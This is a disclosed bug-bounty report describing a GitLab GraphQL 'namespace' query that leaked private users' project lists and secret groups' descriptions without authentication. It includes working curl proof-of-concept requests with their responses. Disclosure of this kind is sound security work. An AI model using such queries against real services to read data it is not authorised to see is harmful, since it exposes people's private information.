# GraphQL query "namespace" leaks data

## Report Details
- **Report ID**: 614355
- **URL**: https://hackerone.com/reports/614355
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-06-14T08:05:48.976Z
- **Disclosed**: 2019-12-03T09:50:15.303Z

## Reporter
- **Username**: rpadovani
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the (parenthesized) sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

### Summary

Using the "namespace" query on Graphql you can retrieve some private data that is not available through Standard API or through Web API

### Steps to reproduce
#### User namespace

1. My Gitlab profile is private: https://gitlab.com/rpadovani
2. You cannot access a list of my projects: https://gitlab.com/users/rpadovani/contributed
3. You cannot access these data through the standard APIs:
```
curl --header "PRIVATE-TOKEN: anotherUserToken" 'https://gitlab.com/api/v4/namespaces/16048'
{"message":"404 Namespace Not Found"}
```
(rpadovani user id is 16048, I used access token of another user for this curl request)
4. You can however access all these data, without any token (so no need to be registered), through Graphql:

```
curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"rpadovani\") {description\n requestAccessEnabled\n fullName\n fullPath\n id\n lfsEnabled\n name\n path\n visibility\n projects (includeSubgroups: true, ) {edges {node {id\n name\n archived\n visibility\n description}}}}}","variables":null,"operationName":null}' 
```
Response (omitted other 19 projects for brevity):

```
{"data":{"namespace":{"description":"","requestAccessEnabled":true,"fullName":"rpadovani","fullPath":"rpadovani","id":"gid://gitlab/Namespace/18021","lfsEnabled":true,"name":"rpadovani","path":"rpadovani","visibility":"public","projects":{"edges":[{"node":{"id":"gid://gitlab/Project/11265641","name":"737-max-8","archived":false,"visibility":"public","description":"https://737max8.com"}}, ...OMIT...     
```
 
#### Group namespace

A Graphql query on a secret group / subgroup can bring to disclose the description of the group
1. No access from GUI: https://gitlab.com/secret-group-213
2. Access through GraphQL (please notice I do not provide any access token, at all):

```
curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"secret-group-213\") {description\n requestAccessEnabled\n fullName\n fullPath\n id\n lfsEnabled\n name\n path\n visibility\n projects (includeSubgroups: true, ) {edges {node {id\n name\n archived\n visibility\n description}}}}}","variables":null,"operationName":null}'
```

Response:

```
{"data":{"namespace":{"description":"This description is secret!","requestAccessEnabled":false,"fullName":"secret group","fullPath":"secret-group-213","id":"gid://gitlab/Group/5337756","lfsEnabled":true,"name":"secret group","path":"secret-group-213","visibility":"private","projects":{"edges":[]}}}}
```

### Impact

This Graphql query makes the `private profile` feature quite useless, and leaks the description and some other information about private groups and subgroups.

The impact is limited because the GraphQL implementation is still at the beginning, I think that the impact of this issue would be bigger, if the GraphQL implementation was au-pair with the APIs implementation

### Examples

(If the bug is project related, please create an example project and export it using the project export feature)

(If you are using an older version of GitLab, this will also help determine whether the bug has been fixed in a more recent version)

(If the bug can be reproduced on GitLab.com without violating the `Rules of Engagement` as outlined in the program policy, please provide the full path to the project.)

### What is the current *bug* behavior?

Access data that shouldn't be accessed

### What is the expected *correct* behavior?

empty response


### Output of checks

This bug happens on GitLab.com

#### Results of GitLab environment info

## Impact

An attacker can bypass the "private profile" check, and can access metadata about secret groups

## Attachments
No attachments
